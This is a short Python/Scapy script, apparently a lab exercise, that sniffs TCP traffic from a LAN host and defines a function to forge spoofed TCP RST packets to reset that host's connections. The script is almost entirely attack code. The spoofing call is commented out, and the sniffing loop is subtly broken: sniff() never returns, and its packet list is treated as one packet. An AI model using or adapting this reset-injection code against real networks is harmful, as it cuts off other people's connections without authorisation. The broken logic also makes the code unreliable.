from scapy.all import *
from scapy.all import send
from scapy.layers.inet import *

srcIP = "192.168.0.103"
destIP = "192.168.0.108"

def spoof_tcp(pkt):
    IPLayer = IP(dst=destIP, src=pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    spoofpkt = IPLayer/TCPLayer
    send(spoofpkt, verbose=1)
    print("Spoofed Packet Sent...")

while 1 > 0:
    pkt = sniff(filter="tcp and src host " + destIP)

    print("Found Packet")
    print(pkt)

    # spoof_tcp(pkt)

